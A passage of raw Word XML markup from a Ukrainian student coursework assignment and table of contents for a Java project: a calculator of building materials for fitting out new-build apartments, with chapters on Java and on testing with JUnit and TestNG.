        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:hanging="369"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Тема </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gram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u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> “</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">Калькулятор для </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>обчислення</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кількості</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необхідніх</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матеріалів</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> для </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Виконання</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конкретної</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роботи</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> в </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>сфері</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будівництва</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облаштування</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> квартир </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>новобудови</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> ”            </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="-5" w:hanging="10"/>
      </w:pP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         </w:t>
      </w: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Термін</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здачі</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> студентом </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>закінченої</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w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="1" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="369"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:spacing w:after="1" w:line="240" w:lineRule="auto"/>
        <w:ind w:hanging="369"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Початкові</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дані</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>до проекту</w:t>
      </w:r>
      <w:proofErr w:type="gram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w:t>
      </w:r>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="26" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00853AAF" w:rsidRDefault="00DC7E52" w:rsidP="00853AAF">
      <w:pPr>
        <w:suppressAutoHyphens/>
        <w:spacing w:after="3" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="340"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Зміст</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розрахунково-пояснювальної</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> записки (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>перелік</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питань</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які</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належить</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розробити</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">):   </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">вступ, основні </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>понянія</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> про мову </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>java</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>. Особливості плюси і мінуси, проектування, література</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="27" w:line="240" w:lineRule="auto"/>
      </w:pP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Перелік</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графічного</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матеріалу</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> (з </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>точним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зазначенням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обов’язкових</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креслень</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28"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3" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="10" w:hanging="10"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Завдання</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> видано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 xml:space="preserve">                  </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="1" w:line="240" w:lineRule="auto"/>
      </w:pP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
    <w:p w:rsidR="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="3" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="10" w:hanging="10"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Завдання</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прийнято</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> до </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>виконання</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                                   </w:t>
      </w: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bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="3" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="10" w:hanging="10"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="001A6C53" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a6"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ЗМІСТ</w:t>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:id w:val="-6749028"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Table of Contents"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w:rsidR="00853AAF" w:rsidRDefault="00853AAF" w:rsidP="0060216E">
          <w:pPr>
            <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
            <w:ind w:left="10" w:hanging="10"/>
            <w:jc w:val="center"/>
          </w:pPr>
        </w:p>
        <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="00853AAF" w:rsidP="0060216E">
          <w:pPr>
            <w:pStyle w:val="11"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
            </w:tabs>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:rPr>
              <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              <w:noProof/>
              <w:sz w:val="28"/>
              <w:lang w:val="en-US"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r>
            <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
          </w:r>
          <w:r>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:hyperlink w:anchor="_Toc10727422" w:history="1">
            <w:r w:rsidR="0060216E" w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
                <w:lang w:val="uk-UA"/>
              </w:rPr>
              <w:t>ВСТУП</w:t>
            </w:r>
            <w:r w:rsidR="0060216E" w:rsidRPr="0060216E">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:webHidden/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="0060216E" w:rsidRPr="0060216E">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:webHidden/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="0060216E" w:rsidRPr="0060216E">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:webHidden/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc10727422 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="0060216E" w:rsidRPr="0060216E">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:webHidden/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="0060216E" w:rsidRPr="0060216E">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:webHidden/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="0060216E" w:rsidRPr="0060216E">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:webHidden/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidR="0060216E" w:rsidRPr="0060216E">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:webHidden/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
          <w:pPr>
            <w:pStyle w:val="11"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
            </w:tabs>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:rPr>
              <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              <w:noProof/>
              <w:sz w:val="28"/>
              <w:lang w:val="en-US"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc10727423" w:history="1">
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t>ГЛАВА 1 ОСНОВНЫЕ О ЯЗЫКЕ JAVA. ОСОБЕННОСТИ, ПЛЮСЫ И МИНУСЫ</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_Toc10727423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5</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4" w:history="1">
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t>1.1Основн</w:t>
            </w:r>
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> аспекти </w:t>
            </w:r>
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Java</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_Toc10727424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5</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5" w:history="1">
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t>1.2Основние знання про мови програмування</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_Toc10727425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5</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6" w:history="1">
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">1.3 Основные возможности </w:t>
            </w:r>
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Java</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_Toc10727426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7</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7" w:history="1">
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">1.4 Преимущества и недостатки </w:t>
            </w:r>
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Java</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_Toc10727427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8</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8" w:history="1">
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>1.5 Что такое тестирование и их виды</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_Toc10727428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10</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9" w:history="1">
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>1.6 Подробнее о видах тестирования</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_Toc10727429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10</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0" w:history="1">
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>1.7 Библиотека J Unit</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_Toc10727430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24</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1" w:history="1">
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>1.8 TestNG</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_Toc10727431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25</w:t>
            </w:r>
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:webHidden/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
          <w:pPr>
            <w:pStyle w:val="11"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
            </w:tabs>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:rPr>
              <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              <w:noProof/>
              <w:sz w:val="28"/>
              <w:lang w:val="en-US"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc10727432" w:history="1">
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
